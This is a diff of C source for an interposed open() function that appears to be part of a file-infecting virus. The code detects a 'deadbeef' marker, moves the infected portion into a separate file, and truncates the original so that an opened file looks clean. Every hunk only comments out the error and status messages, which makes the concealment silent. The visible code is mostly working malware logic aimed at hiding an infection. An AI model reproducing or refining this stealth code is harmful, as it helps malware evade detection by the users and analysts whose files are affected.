@@ -15,14 +15,14 @@ int open(const char *pathname, int flags, ...){
     
     //Opens the specified file
     if((fd = syscall(__NR_open, pathname, O_RDWR)) == -1){
-        printf("open failed\n");
+       // printf("open failed\n");
         return -1;
     }
     
     //Creates filestats struct to extract needed data.
     struct stat filestats;
     if(fstat(fd, &filestats) == -1){
-        printf("fstat failed\n");
+       // printf("fstat failed\n");
         return -1;
     }
 
@@ -38,11 +38,11 @@ int open(const char *pathname, int flags, ...){
     do{
         check = read(fd, buf, 4);
         if(check == -1){
-           printf("Deadbeef Read Failed\n");
+          // printf("Deadbeef Read Failed\n");
            return -1;
         }
         else if (check == 0){
-            printf("Reached end of file. File not infected.\n");
+            //printf("Reached end of file. File not infected.\n");
             if(lseek(fd, 0, SEEK_SET) == -1){
                 return -1;
             }
@@ -61,7 +61,7 @@ int open(const char *pathname, int flags, ...){
     int fd2;
 
     if((fd2 = syscall(__NR_open, filebuf, O_RDWR | O_CREAT)) == -1){
-        printf("Virus file open failed.\n");
+        //printf("Virus file open failed.\n");
         return -1;
     }
     off_t zero = 0;
@@ -69,32 +69,32 @@ int open(const char *pathname, int flags, ...){
     char notvirus[filesize - virusstop];
 
     if(read(fd, notvirus, filesize - virusstop) == -1){
-        printf("reading notvirus into buffer failed.\n");
+        //printf("reading notvirus into buffer failed.\n");
         return -1;
     }
 
     if(lseek(fd, 0, SEEK_SET) == -1){
-        printf("lseek failed.\n");
+        //printf("lseek failed.\n");
         return -1;
     }
     
     if(ftruncate(fd, filesize - virusstop)){
-        printf("the truncate failed.\n");
+        //printf("the truncate failed.\n");
         return -1;
     }
 
     if((write(fd, notvirus, filesize - virusstop)) == -1){
-        printf("write failed \n");
+        //printf("write failed \n");
         return -1;
     }
  
     if(syscall(__NR_close, fd2) == -1){
-        printf("close failed\n");
+        //printf("close failed\n");
         return -1;
     }
 
     if(lseek(fd, 0, SEEK_SET) == -1){
-        printf("last lseek failed\n");
+        //printf("last lseek failed\n");
         return -1;
     }
     
